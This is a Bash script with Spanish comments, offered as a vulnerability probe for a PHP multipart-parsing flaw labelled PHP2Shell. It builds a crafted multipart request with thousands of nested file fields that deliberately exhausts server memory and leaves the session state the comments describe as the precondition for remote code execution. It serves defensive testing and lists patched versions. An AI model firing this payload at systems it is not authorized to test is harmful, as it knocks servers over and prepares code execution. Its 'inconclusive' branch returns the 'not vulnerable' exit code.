#!/usr/bin/env bash
# check_exposure.sh — Sonda de una sola pasada para detectar si un servidor
# PHP es vulnerable a la rama PHP2Shell (CVE-2026-109618 / CVE-2026-109619).
#
# Solo lectura: envia una peticion multipart malformada y comprueba si el
# servidor agota su memoria. No explota, no modifica datos, no deja rastros
# mas alla de un fichero de sesion temporal.
#
# Uso:
#   ./check_exposure.sh https://tu-app.example.com/upload
#   ./check_exposure.sh http://127.0.0.1:8080/index.php
#
# Exit codes:
#   0 -> NO vulnerable (el OOM no se dispara)
#   1 -> VULNERABLE (el OOM se dispara: el estado colgante queda activo)
#   2 -> error de uso / de red
#
# AVISO: esta sonda provoca un agotamiento de memoria en el servidor. Solo
# usala contra sistemas tuyos o con autorizacion escrita explicita.

set -uo pipefail

TARGET="${1:-}"
RECORDS="${RECORDS:-3000}"

if [[ -z "$TARGET" ]]; then
    echo "uso: $0 <url-de-upload>   (env: RECORDS=<n>, por defecto 3000)" >&2
    exit 2
fi

if ! command -v curl >/dev/null 2>&1; then
    echo "error: se necesita curl" >&2
    exit 2
fi

echo "[*] Objetivo: ${TARGET}"
echo "[*] Registros anidados: ${RECORDS}"

# Cada registro necesita un nombre TOP-LEVEL DISTINTO (f0, f1, ...). Si
# todos comparten prefijo, PHP fusiona los arboles $_FILES y no hay
# presion de memoria: la sonda daria un falso negativo.
#
# El anidamiento profundo (11 niveles) y filename="" son los que hacen que
# PHP cree las seis entradas de $_FILES por cada parte del multipart.
args=()
for ((i = 0; i < RECORDS; i++)); do
    args+=(-F "f${i}[a][a][a][a][a][a][a][a][a][a][a]=@/dev/null;filename=")
done

out=$(curl -s --max-time 120 -X POST "${TARGET}" \
    -F "PHPSESSID=$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')" \
    -F "PHP_SESSION_UPLOAD_PROGRESS=pwn" \
    -F "fz=@/dev/null;filename=a.txt" \
    "${args[@]}" 2>&1)

if echo "$out" | grep -q "exhausted"; then
    echo
    echo "[!] VULNERABLE: el servidor agoto su memoria durante el parseo multipart."
    echo "    El OOM deja el estado de sesion colgante en el worker, que es la"
    echo "    condicion previa de la ejecucion remota de codigo."
    echo
    echo "    Remedio: actualizar PHP a 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12"
    echo "             (PHP 7.4 no recibira parche)."
    exit 1
fi

if echo "$out" | grep -q "Multipart body parts limit exceeded"; then
    echo
    echo "[?] INCONCLUYENTE: el limite max_multipart_body_parts corto la peticion"
    echo "    antes del OOM. Repite con RECORDS menor, o desactiva ese limite"
    echo "    temporalmente en un entorno de pruebas para confirmar."
    exit 0
fi

echo
echo "[+] NO vulnerable: no se disparo el OOM (probablemente PHP parcheado)."
exit 0
